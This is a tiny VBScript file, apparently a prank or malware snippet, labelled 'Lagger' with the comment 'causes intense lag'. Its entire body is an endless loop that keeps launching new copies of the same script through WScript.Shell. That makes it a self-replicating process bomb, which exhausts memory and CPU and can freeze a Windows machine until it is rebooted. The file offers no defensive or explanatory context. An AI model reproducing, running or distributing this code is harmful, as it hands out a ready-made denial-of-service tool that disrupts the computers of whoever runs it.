'extension
'Lagger
'green
'causes intense lag
Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
Do
    objShell.Run "wscript.exe """ & WScript.ScriptFullName & """"
Loop
